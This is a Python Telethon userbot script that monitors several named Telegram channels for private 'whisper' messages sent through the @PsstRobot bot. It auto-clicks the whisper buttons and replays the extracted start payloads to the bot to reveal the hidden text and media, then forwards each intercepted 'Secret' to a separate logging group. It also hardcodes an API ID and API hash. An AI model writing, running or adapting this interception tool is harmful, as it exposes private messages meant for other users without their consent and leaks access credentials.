import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

ctx = {"title": "Target Channel", "link": "#", "time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== HANDLERS ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons: return
    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    print(f"\n🔍 WHISPER DETECTED: [{chat_name}]", flush=True)

    try:
        payload = None
        for row in event.buttons:
            for btn in row:
                if btn.url and 'PsstRobot?start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    print(f"✅ Found Link Payload: {payload}", flush=True)

        res = await event.click(0)
        popup_text = ""
        if hasattr(res, 'message') and res.message: popup_text = res.message
        elif isinstance(res, str): popup_text = res

        if popup_text and "-wh::" in popup_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup_text)
            if match:
                payload = match.group(0)
                print(f"✅ Found Popup Payload: {payload}", flush=True)

        if payload or "advanced" in popup_text.lower():
            print(f"🚀 Triggering Advanced Media...", flush=True)
            ctx.update({"title": chat_name, "time": start_time})
            await client.send_message(WHISPER_BOT_ID, f"/start {payload}" if payload else "/start")
        elif popup_text:
            log = f"🔓 **Whisper Intercepted!**\n\n📝 **Secret:** {popup_text}\n📍 **Channel:** {chat_name}"
            await client.send_message(LOG_GROUP_ID, log)
            print(f"✅ Short Whisper Sent", flush=True)
    except Exception as e:
        print(f"❌ Error: {e}", flush=True)

@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    if event.buttons:
        print("🖱️ Clicking START button in Bot DM...", flush=True)
        await event.click(0)
        return
    if event.message.text and any(x in event.message.text for x in ["Preparing", "/start"]): return

    print(f"📩 MEDIA RECEIVED IN DM!", flush=True)
    try:
        log = f"🔓 **Advanced Whisper Decoded!**\n\n📝 **Secret:** [Media/Long Message]\n{event.message.text or ''}\n📍 **Channel:** {ctx['title']}"
        await client.send_message(LOG_GROUP_ID, log, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Media Redirected", flush=True)
    except Exception as e:
        print(f"❌ DM Error: {e}", flush=True)

# ==================== STARTUP ====================
async def handle_ping(request): return web.Response(text="Bot Active")
async def main():
    print("🚀 PRO WHISPER AUTOMATOR STARTING...", flush=True)
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
    await client.get_dialogs()
    print("🟢 ONLINE AND LISTENING...", flush=True)
    await client.run_until_disconnected()

if __name__ == "__main__": asyncio.run(main())
